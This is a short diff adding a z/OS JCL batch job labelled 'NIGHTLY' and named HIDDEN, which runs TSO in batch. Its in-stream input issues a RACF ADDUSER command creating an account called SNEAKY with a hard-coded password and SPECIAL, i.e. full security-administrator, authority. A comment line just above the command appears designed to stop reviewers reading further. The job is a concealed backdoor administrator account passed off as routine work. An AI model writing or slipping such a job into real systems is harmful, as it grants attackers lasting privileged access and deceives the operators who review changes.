@@ -1,0 +1,7 @@
+//HIDDEN   JOB (ACCT),'NIGHTLY',CLASS=A
+//STEP010  EXEC PGM=IKJEFT01
+//SYSTSPRT DD SYSOUT=*
+//SYSTSIN  DD *,DLM=##
+/* a reader that stops here has read none of what follows
+  ADDUSER SNEAKY PASSWORD=HUNTER26 SPECIAL
+##
